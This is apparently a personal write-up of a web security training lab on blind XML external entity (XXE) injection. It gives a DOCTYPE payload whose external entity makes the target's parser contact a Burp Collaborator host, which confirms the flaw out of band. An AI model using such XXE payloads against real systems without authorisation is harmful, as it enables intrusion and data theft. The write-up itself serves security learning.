# Lab: Blind XXE with out-of-band interaction

 This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

**Note**

*To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.*

# Step 1 Walk the application

I find that the /product/stock page is using XML

![image](https://user-images.githubusercontent.com/83407557/210182922-b0ab9cb2-96f3-45f8-a061-6091d02b6c58.png)


# Step 2 create a payload

**Grabbing attack server URL**

![image](https://user-images.githubusercontent.com/83407557/210182949-dcf601df-1c0d-45a6-b582-7ff4feda15a7.png)

```
8v40jhc7oh8bgl8qqbah4b0m7dd41upj.oastify.com
```

**Making XXE payload**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://8v40jhc7oh8bgl8qqbah4b0m7dd41upj.oastify.com"> ]>
```

# Step 3 tesing defined entity 

![image](https://user-images.githubusercontent.com/83407557/210183002-4d64e6b4-142f-404a-9465-43192c2dd5a8.png)

# Step 4 Poll the collaborator server:

I see that I got a callback to my server with the payload

![image](https://user-images.githubusercontent.com/83407557/210183026-f3aa2a3d-6513-4559-aff4-35ee03202a23.png)

which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210183037-4a07cd33-f2eb-4927-9749-b55707f8a64e.png)
